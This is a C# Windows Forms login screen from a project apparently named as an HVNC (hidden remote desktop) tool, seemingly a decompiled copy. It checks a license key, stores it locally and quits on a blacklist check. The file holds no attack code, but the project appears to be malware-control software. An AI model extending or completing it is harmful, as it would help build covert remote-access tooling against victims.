using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BirdBrainmofo.HVNC.Controls.Renderers;

namespace BirdBrainmofo.HVNC
{
	public class Login : Form
	{
        public string Keys = string.Empty;

        private IContainer components;

        private static readonly string name;

        private static readonly string ICARUSid;

        private static readonly string ICARUSmystic;

        private static readonly string version;

        public static Phychedelic trance;

        private PrimeTheme primeTheme1;

        private Label label3;

        private PictureBox pictureBox1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private PrimeButton primeButton2;

        private PrimeButton primeButton1;

        private TextBox txtKey;

        private PictureBox pictureBox2;

        private Label label1;

        private JCS.ToggleSwitch chkSave;

        private Label label5;

        private Label status;

        private Button button1;

        public Login()
		{
			this.InitializeComponent();
		}

		private void studioButton5_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		private void studioButton4_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void primeButton2_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		private void primeButton1_Click(object sender, EventArgs e)
		{
			Login.trance.license(this.txtKey.Text);
            new Thread((ThreadStart)delegate
            {
                if (trance.response.success)
                {
                    if (chkSave.Checked && !File.Exists(Application.StartupPath + "\\LocalUser"))
                    {
                        Directory.CreateDirectory(Application.StartupPath + "\\LocalUser");
                        File.WriteAllText(contents: txtKey.Text, path: Application.StartupPath + "\\LocalUser\\Key.ini");
                    }
                    Hide();
                }
                else
                {
                    status.Text = "Status: " + trance.response.message;
                }
            }).Start();
        }

		private void Login_FormClosed(object sender, FormClosedEventArgs e)
		{
			Application.Exit();
		}

		private void Login_FormClosing(object sender, FormClosingEventArgs e)
		{
			Application.Exit();
		}

		private void Login_Load(object sender, EventArgs e)
		{
            txtKey.UseSystemPasswordChar = true;
            trance.init();
            if (File.Exists(Application.StartupPath + "\\LocalUser\\Key.ini"))
            {
                chkSave.Checked = true;
                using (StreamReader streamReader = new StreamReader(Application.StartupPath + "\\LocalUser\\Key.ini"))
                {
                    if (!string.IsNullOrWhiteSpace(streamReader.ReadToEnd()))
                    {
                        Keys = File.ReadAllText(Application.StartupPath + "\\LocalUser\\Key.ini");
                        txtKey.Text = Keys;
                        streamReader.Dispose();
                    }
                }
                button1.PerformClick();
            }
            if (trance.checkblack())
            {
                Environment.Exit(0);
            }
        }

		private void button1_Click(object sender, EventArgs e)
		{
            trance.license(txtKey.Text);
            if (trance.response.success)
            {
                if (chkSave.Checked && !File.Exists(Application.StartupPath + "\\LocalUser"))
                {
                    Directory.CreateDirectory(Application.StartupPath + "\\LocalUser");
                    File.WriteAllText(contents: "Key|" + txtKey.Text, path: Application.StartupPath + "\\LocalUser\\Key.ini");
                }
                Hide();
            }
            else
            {
                status.Text = "Status: " + trance.response.message;
            }
        }

		protected override void Dispose(bool disposing)
		{
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

		private void InitializeComponent()
		{
			BloomBrain bloom = new BloomBrain();
			BloomBrain bloom2 = new BloomBrain();
			BloomBrain bloom3 = new BloomBrain();
			BloomBrain bloom4 = new BloomBrain();
			BloomBrain bloom5 = new BloomBrain();
			BloomBrain bloom6 = new BloomBrain();
			BloomBrain bloom7 = new BloomBrain();
			BloomBrain bloom8 = new BloomBrain();
			BloomBrain bloom9 = new BloomBrain();
			BloomBrain bloom10 = new BloomBrain();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.Login));
			BloomBrain bloom11 = new BloomBrain();
			BloomBrain bloom12 = new BloomBrain();
			BloomBrain bloom13 = new BloomBrain();
			BloomBrain bloom14 = new BloomBrain();
			BloomBrain bloom15 = new BloomBrain();
			BloomBrain bloom16 = new BloomBrain();
			BloomBrain bloom17 = new BloomBrain();
			BloomBrain bloom18 = new BloomBrain();
			BloomBrain bloom19 = new BloomBrain();
			BloomBrain bloom20 = new BloomBrain();
			BloomBrain bloom21 = new BloomBrain();
			BloomBrain bloom22 = new BloomBrain();
			BloomBrain bloom23 = new BloomBrain();
			BloomBrain bloom24 = new BloomBrain();
			BloomBrain bloom25 = new BloomBrain();
			BloomBrain bloom26 = new BloomBrain();
			BloomBrain bloom27 = new BloomBrain();
			BloomBrain bloom28 = new BloomBrain();
			BloomBrain bloom29 = new BloomBrain();
			BloomBrain bloom30 = new BloomBrain();
			BloomBrain bloom31 = new BloomBrain();
			BloomBrain bloom32 = new BloomBrain();
			BloomBrain bloom33 = new BloomBrain();
			BloomBrain bloom34 = new BloomBrain();
			BloomBrain bloom35 = new BloomBrain();
			BloomBrain bloom36 = new BloomBrain();
			BloomBrain bloom37 = new BloomBrain();
			BloomBrain bloom38 = new BloomBrain();
			BloomBrain bloom39 = new BloomBrain();
			BloomBrain bloom40 = new BloomBrain();
			BloomBrain bloom41 = new BloomBrain();
			BloomBrain bloom42 = new BloomBrain();
			BloomBrain bloom43 = new BloomBrain();
			BloomBrain bloom44 = new BloomBrain();
			BloomBrain bloom45 = new BloomBrain();
			BloomBrain bloom46 = new BloomBrain();
			BloomBrain bloom47 = new BloomBrain();
			BloomBrain bloom48 = new BloomBrain();
			BloomBrain bloom49 = new BloomBrain();
			BloomBrain bloom50 = new BloomBrain();
			BloomBrain bloom51 = new BloomBrain();
			BloomBrain bloom52 = new BloomBrain();
			BloomBrain bloom53 = new BloomBrain();
			BloomBrain bloom54 = new BloomBrain();
			BloomBrain bloom55 = new BloomBrain();
			BloomBrain bloom56 = new BloomBrain();
			BloomBrain bloom57 = new BloomBrain();
			BloomBrain bloom58 = new BloomBrain();
			this.primeTheme1 = new PrimeTheme();
			this.button1 = new System.Windows.Forms.Button();
			this.status = new System.Windows.Forms.Label();
			this.label5 = new System.Windows.Forms.Label();
			this.chkSave = new JCS.ToggleSwitch();
			this.pictureBox2 = new System.Windows.Forms.PictureBox();
			this.label1 = new System.Windows.Forms.Label();
			this.txtKey = new System.Windows.Forms.TextBox();
			this.primeButton2 = new PrimeButton();
			this.primeButton1 = new PrimeButton();
			this.label3 = new System.Windows.Forms.Label();
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.studioButton5 = new StudioButton();
			this.studioButton4 = new StudioButton();
			this.primeTheme1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.primeTheme1.BackColor = System.Drawing.Color.White;
			this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
			bloom.Name = "Sides";
			bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
			bloom2.Name = "Gradient1";
			bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom3.Name = "Gradient2";
			bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom4.Name = "TextShade";
			bloom4.Value = System.Drawing.Color.White;
			bloom5.Name = "Text";
			bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom6.Name = "Back";
			bloom6.Value = System.Drawing.Color.White;
			bloom7.Name = "Border1";
			bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			bloom8.Name = "Border2";
			bloom8.Value = System.Drawing.Color.White;
			bloom9.Name = "Border3";
			bloom9.Value = System.Drawing.Color.White;
			bloom10.Name = "Border4";
			bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
			this.primeTheme1.Colors = new BloomBrain[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
			this.primeTheme1.Controls.Add(this.button1);
			this.primeTheme1.Controls.Add(this.status);
			this.primeTheme1.Controls.Add(this.label5);
			this.primeTheme1.Controls.Add(this.chkSave);
			this.primeTheme1.Controls.Add(this.pictureBox2);
			this.primeTheme1.Controls.Add(this.label1);
			this.primeTheme1.Controls.Add(this.txtKey);
			this.primeTheme1.Controls.Add(this.primeButton2);
			this.primeTheme1.Controls.Add(this.primeButton1);
			this.primeTheme1.Controls.Add(this.label3);
			this.primeTheme1.Controls.Add(this.pictureBox1);
			this.primeTheme1.Controls.Add(this.studioButton5);
			this.primeTheme1.Controls.Add(this.studioButton4);
			this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
			this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
			this.primeTheme1.Image = null;
			this.primeTheme1.Location = new System.Drawing.Point(0, 0);
			this.primeTheme1.Movable = true;
			this.primeTheme1.Name = "primeTheme1";
			this.primeTheme1.NoRounding = false;
			this.primeTheme1.Sizable = true;
			this.primeTheme1.Size = new System.Drawing.Size(548, 315);
			this.primeTheme1.SmartBounds = true;
			this.primeTheme1.TabIndex = 0;
			this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
			this.button1.Location = new System.Drawing.Point(242, 192);
			this.button1.Name = "button1";
			this.button1.Size = new System.Drawing.Size(35, 23);
			this.button1.TabIndex = 53;
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Visible = false;
			this.button1.Click += new System.EventHandler(button1_Click);
			this.status.AutoSize = true;
			this.status.BackColor = System.Drawing.Color.Transparent;
			this.status.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.status.Location = new System.Drawing.Point(19, 285);
			this.status.Name = "status";
			this.status.Size = new System.Drawing.Size(48, 13);
			this.status.TabIndex = 52;
			this.status.Text = "Status";
			this.status.Visible = false;
			this.label5.AutoSize = true;
			this.label5.Location = new System.Drawing.Point(200, 197);
			this.label5.Name = "label5";
			this.label5.Size = new System.Drawing.Size(36, 13);
			this.label5.TabIndex = 51;
			this.label5.Text = "Save";
			this.chkSave.BackColor = System.Drawing.Color.Transparent;
			this.chkSave.Location = new System.Drawing.Point(144, 192);
			this.chkSave.Name = "chkSave";
			this.chkSave.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkSave.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkSave.Size = new System.Drawing.Size(50, 19);
			this.chkSave.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkSave.TabIndex = 50;
			this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
			this.pictureBox2.Location = new System.Drawing.Point(31, 87);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new System.Drawing.Size(103, 99);
			this.pictureBox2.TabIndex = 49;
			this.pictureBox2.TabStop = false;
			this.label1.AutoSize = true;
			this.label1.BackColor = System.Drawing.Color.Transparent;
			this.label1.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.Location = new System.Drawing.Point(141, 141);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(35, 13);
			this.label1.TabIndex = 48;
			this.label1.Text = "Key:";
			this.txtKey.Location = new System.Drawing.Point(141, 157);
			this.txtKey.Multiline = true;
			this.txtKey.Name = "txtKey";
			this.txtKey.Size = new System.Drawing.Size(376, 29);
			this.txtKey.TabIndex = 47;
			bloom11.Name = "DownGradient1";
			bloom11.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom12.Name = "DownGradient2";
			bloom12.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom13.Name = "NoneGradient1";
			bloom13.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom14.Name = "NoneGradient2";
			bloom14.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom15.Name = "NoneGradient3";
			bloom15.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom16.Name = "NoneGradient4";
			bloom16.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom17.Name = "Glow";
			bloom17.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
			bloom18.Name = "TextShade";
			bloom18.Value = System.Drawing.Color.White;
			bloom19.Name = "Text";
			bloom19.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom20.Name = "Border1";
			bloom20.Value = System.Drawing.Color.White;
			bloom21.Name = "Border2";
			bloom21.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			this.primeButton2.Colors = new BloomBrain[11]
			{
				bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
				bloom21
			};
			this.primeButton2.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
			this.primeButton2.Font = new System.Drawing.Font("Verdana", 8f);
			this.primeButton2.Image = null;
			this.primeButton2.Location = new System.Drawing.Point(31, 229);
			this.primeButton2.Name = "primeButton2";
			this.primeButton2.NoRounding = false;
			this.primeButton2.Size = new System.Drawing.Size(126, 48);
			this.primeButton2.TabIndex = 42;
			this.primeButton2.Text = "Exit";
			this.primeButton2.Transparent = false;
			this.primeButton2.Click += new System.EventHandler(primeButton2_Click);
			bloom22.Name = "DownGradient1";
			bloom22.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom23.Name = "DownGradient2";
			bloom23.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom24.Name = "NoneGradient1";
			bloom24.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom25.Name = "NoneGradient2";
			bloom25.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom26.Name = "NoneGradient3";
			bloom26.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom27.Name = "NoneGradient4";
			bloom27.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom28.Name = "Glow";
			bloom28.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
			bloom29.Name = "TextShade";
			bloom29.Value = System.Drawing.Color.White;
			bloom30.Name = "Text";
			bloom30.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom31.Name = "Border1";
			bloom31.Value = System.Drawing.Color.White;
			bloom32.Name = "Border2";
			bloom32.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			this.primeButton1.Colors = new BloomBrain[11]
			{
				bloom22, bloom23, bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31,
				bloom32
			};
			this.primeButton1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
			this.primeButton1.Font = new System.Drawing.Font("Verdana", 8f);
			this.primeButton1.Image = null;
			this.primeButton1.Location = new System.Drawing.Point(391, 229);
			this.primeButton1.Name = "primeButton1";
			this.primeButton1.NoRounding = false;
			this.primeButton1.Size = new System.Drawing.Size(126, 48);
			this.primeButton1.TabIndex = 41;
			this.primeButton1.Text = "Login";
			this.primeButton1.Transparent = false;
			this.primeButton1.Click += new System.EventHandler(primeButton1_Click);
			this.label3.AutoSize = true;
			this.label3.BackColor = System.Drawing.Color.Transparent;
			this.label3.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label3.Location = new System.Drawing.Point(39, 14);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(42, 13);
			this.label3.TabIndex = 40;
			this.label3.Text = "Login";
			this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
			this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new System.Drawing.Point(3, -1);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(42, 40);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 39;
			this.pictureBox1.TabStop = false;
			this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton5.BackColor = System.Drawing.Color.Transparent;
			bloom33.Name = "DownGradient1";
			bloom33.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom34.Name = "DownGradient2";
			bloom34.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom35.Name = "NoneGradient1";
			bloom35.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom36.Name = "NoneGradient2";
			bloom36.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom37.Name = "Shine1";
			bloom37.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom38.Name = "Shine2A";
			bloom38.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom39.Name = "Shine2B";
			bloom39.Value = System.Drawing.Color.Transparent;
			bloom40.Name = "Shine3";
			bloom40.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom41.Name = "TextShade";
			bloom41.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom42.Name = "Text";
			bloom42.Value = System.Drawing.Color.White;
			bloom43.Name = "Glow";
			bloom43.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom44.Name = "Border";
			bloom44.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom45.Name = "Corners";
			bloom45.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton5.Colors = new BloomBrain[13]
			{
				bloom33, bloom34, bloom35, bloom36, bloom37, bloom38, bloom39, bloom40, bloom41, bloom42,
				bloom43, bloom44, bloom45
			};
			this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton5.Image = null;
			this.studioButton5.Location = new System.Drawing.Point(523, -4);
			this.studioButton5.Name = "studioButton5";
			this.studioButton5.NoRounding = false;
			this.studioButton5.Size = new System.Drawing.Size(13, 30);
			this.studioButton5.TabIndex = 38;
			this.studioButton5.Transparent = true;
			this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
			this.studioButton4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton4.BackColor = System.Drawing.Color.Transparent;
			bloom46.Name = "DownGradient1";
			bloom46.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom47.Name = "DownGradient2";
			bloom47.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom48.Name = "NoneGradient1";
			bloom48.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom49.Name = "NoneGradient2";
			bloom49.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom50.Name = "Shine1";
			bloom50.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom51.Name = "Shine2A";
			bloom51.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom52.Name = "Shine2B";
			bloom52.Value = System.Drawing.Color.Transparent;
			bloom53.Name = "Shine3";
			bloom53.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom54.Name = "TextShade";
			bloom54.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom55.Name = "Text";
			bloom55.Value = System.Drawing.Color.White;
			bloom56.Name = "Glow";
			bloom56.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom57.Name = "Border";
			bloom57.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom58.Name = "Corners";
			bloom58.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton4.Colors = new BloomBrain[13]
			{
				bloom46, bloom47, bloom48, bloom49, bloom50, bloom51, bloom52, bloom53, bloom54, bloom55,
				bloom56, bloom57, bloom58
			};
			this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton4.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton4.Image = null;
			this.studioButton4.Location = new System.Drawing.Point(504, -4);
			this.studioButton4.Name = "studioButton4";
			this.studioButton4.NoRounding = false;
			this.studioButton4.Size = new System.Drawing.Size(13, 30);
			this.studioButton4.TabIndex = 37;
			this.studioButton4.Transparent = true;
			this.studioButton4.Click += new System.EventHandler(studioButton4_Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(548, 315);
			base.Controls.Add(this.primeTheme1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Login";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Login";
			base.TransparencyKey = System.Drawing.Color.Fuchsia;
			base.Load += new System.EventHandler(Login_Load);
			this.primeTheme1.ResumeLayout(false);
			this.primeTheme1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
		}

        static Login()
        {
            name = "";
            ICARUSid = "";
            ICARUSmystic = "";
            version = "";
            trance = new Phychedelic(name, ICARUSid, ICARUSmystic, version);
        }

  //      [CompilerGenerated]
		//private void primeButton1_Click1()
		//{
		//	if (Login.trance.response.success)
		//	{
		//		if (this.chkSave.Checked && !File.Exists(Application.StartupPath + Class2.smethod_15(1794)))
		//		{
		//			Directory.CreateDirectory(Application.StartupPath + Class2.smethod_15(1794));
		//			File.WriteAllText(contents: this.txtKey.Text, path: Application.StartupPath + Class2.smethod_15(1754));
		//		}
		//		base.Hide();
		//	}
		//	else
		//	{
		//		this.status.Text = Class2.smethod_15(1830) + Login.trance.response.message;
		//	}
		//}
	}
}
